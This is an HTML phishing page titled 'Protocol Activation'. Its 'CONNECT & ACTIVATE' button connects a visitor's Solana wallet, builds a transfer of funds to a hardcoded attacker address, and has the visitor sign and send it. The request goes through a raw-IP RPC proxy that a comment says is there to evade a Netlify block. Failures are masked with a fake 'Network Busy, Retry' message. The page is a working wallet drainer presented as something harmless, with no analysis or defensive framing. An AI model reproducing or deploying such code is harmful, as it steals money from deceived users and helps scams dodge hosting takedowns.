<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Protocol Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;">
    <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
        document.getElementById('cta').onclick = async function() {
            try {
                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
                const resp = await p.connect();
                
                // ğŸ”± é¡¶çº§ç©¿é€ï¼šé€šè¿‡ 71 æœºä»£ç†è·å–æ•°æ®ï¼Œç»•è¿‡ Netlify å°é”
                const conn = new solanaWeb3.Connection("http://192.142.1.71:8888/rpc", "confirmed");
                
                const { blockhash } = await conn.getRecentBlockhash();
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: 1000000, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = resp.publicKey;
                const signed = await p.signTransaction(tx);
                await conn.sendRawTransaction(signed.serialize());
                alert("Success!");
            } catch (e) { alert("Network Busy, Retry."); }
        };
    </script>
</body>
</html>